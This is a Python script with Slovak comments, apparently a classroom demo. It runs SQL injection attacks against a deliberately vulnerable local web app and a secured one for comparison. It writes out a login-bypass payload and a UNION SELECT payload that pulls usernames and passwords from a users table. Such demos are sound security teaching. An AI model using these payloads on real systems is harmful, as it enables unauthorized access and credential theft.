"""
attack_demo.py — automatizovaná demonštrácia SQL injection.

Skript porovná ZRANITEĽNÚ appku (port 5000) a BEZPEČNÚ appku (port 5001):
  1. Login bypass cez SQLi payload   ' OR '1'='1' --
  2. UNION-based extrakcia hesiel z tabuľky users

Použitie:
  1. Spusti zraniteľnú appku:   python vulnerable/app.py
  2. Spusti bezpečnú appku:     python secure/app.py
  3. Spusti toto demo:          python attack_demo.py

Skript nič neničí — iba posiela HTTP požiadavky a vypisuje výsledok.
Určené výhradne na školskú demonštráciu na vlastných, lokálnych appkách.
"""

import sys
import requests

# Na Windows konzole (cp1250) by diakritika/emoji padli na UnicodeEncodeError.
# Prepneme výstup na UTF-8, aby demo bežalo v každom termináli rovnako.
try:
    sys.stdout.reconfigure(encoding="utf-8")
except (AttributeError, ValueError):
    pass

VULN_URL = "http://127.0.0.1:5000"
SECURE_URL = "http://127.0.0.1:5001"

# Payload na obídenie loginu: podmienka '1'='1' je vždy pravdivá,
# dvojpomlčka  --  zakomentuje zvyšok pôvodného dotazu (kontrolu hesla).
LOGIN_PAYLOAD = {"username": "admin' OR '1'='1' -- ", "password": "cokolvek"}

# Payload na UNION-based extrakciu: pôvodný SELECT má 4 stĺpce
# (id, name, description, price), takže pripojíme UNION SELECT so 4 stĺpcami
# z tabuľky users. Heslá sa tak zobrazia v zozname "produktov".
UNION_PAYLOAD = "' UNION SELECT id, username, password, role FROM users -- "


def hr(title):
    print("\n" + "=" * 70)
    print(title)
    print("=" * 70)


def check_server(url, name):
    try:
        requests.get(url, timeout=3)
        return True
    except requests.exceptions.RequestException:
        print(f"[!] Appka '{name}' nebeží na {url}.")
        return False


def demo_login_bypass(base_url, label):
    hr(f"[1] LOGIN BYPASS — {label}  ({base_url})")
    print(f"    Payload username: {LOGIN_PAYLOAD['username']!r}")
    print(f"    Payload password: {LOGIN_PAYLOAD['password']!r}")

    session = requests.Session()
    resp = session.post(f"{base_url}/login", data=LOGIN_PAYLOAD, timeout=5)

    # Po úspešnom prihlásení appka presmeruje na "/" a tam je text
    # "Prihlásený ako". Ak je tam, bypass vyšiel.
    home = session.get(f"{base_url}/", timeout=5)
    if "Prihlásený ako" in home.text:
        print("    >>> VÝSLEDOK: [OK] Login OBÍDENÝ! Útočník je prihlásený bez hesla.")
        return True
    else:
        print("    >>> VÝSLEDOK: [X] Login zlyhal — bypass NEPREŠIEL.")
        return False


def demo_union_extraction(base_url, label):
    hr(f"[2] UNION-BASED EXTRAKCIA DÁT — {label}  ({base_url})")
    print(f"    Payload search: {UNION_PAYLOAD!r}")

    resp = requests.get(
        f"{base_url}/products", params={"search": UNION_PAYLOAD}, timeout=5
    )

    # Hľadáme vo výstupe stopy hesiel / mien z tabuľky users.
    leaked = []
    for marker in ["SuperTajneHeslo123", "jano2024", "macka.*"]:
        if marker in resp.text:
            leaked.append(marker)

    if leaked:
        print("    >>> VÝSLEDOK: [OK] ÚNIK DÁT! Z tabuľky users unikli hodnoty:")
        for item in leaked:
            print(f"          - {item}")
    else:
        print("    >>> VÝSLEDOK: [X] Žiadne dáta neunikli — injection NEPREŠLA.")
    return bool(leaked)


def main():
    hr("SQL INJECTION — DEMONŠTRÁCIA (vulnerable vs. secure)")

    vuln_up = check_server(VULN_URL, "vulnerable")
    secure_up = check_server(SECURE_URL, "secure")
    if not (vuln_up and secure_up):
        print("\nNajprv spusti obe appky (vulnerable/app.py a secure/app.py).")
        sys.exit(1)

    # ---- ZRANITEĽNÁ appka: útoky by mali USPIEŤ ----
    v_login = demo_login_bypass(VULN_URL, "ZRANITEĽNÁ")
    v_union = demo_union_extraction(VULN_URL, "ZRANITEĽNÁ")

    # ---- BEZPEČNÁ appka: tie isté útoky by mali ZLYHAŤ ----
    s_login = demo_login_bypass(SECURE_URL, "BEZPEČNÁ")
    s_union = demo_union_extraction(SECURE_URL, "BEZPEČNÁ")

    # ---- Zhrnutie ----
    hr("ZHRNUTIE")
    print(f"  Zraniteľná — login bypass:     {'ÚSPEŠNÝ [OK]' if v_login else 'zlyhal [X]'}")
    print(f"  Zraniteľná — UNION extrakcia:  {'ÚSPEŠNÁ [OK]' if v_union else 'zlyhala [X]'}")
    print(f"  Bezpečná   — login bypass:     {'ÚSPEŠNÝ [OK]' if s_login else 'ODOLALA [X]'}")
    print(f"  Bezpečná   — UNION extrakcia:  {'ÚSPEŠNÁ [OK]' if s_union else 'ODOLALA [X]'}")
    print()
    if v_login and v_union and not s_login and not s_union:
        print("  => Presne očakávaný výsledok: zraniteľná padla, bezpečná odolala.")
    else:
        print("  => Pozor: výsledok sa líši od očakávania, skontroluj stav appiek.")


if __name__ == "__main__":
    main()
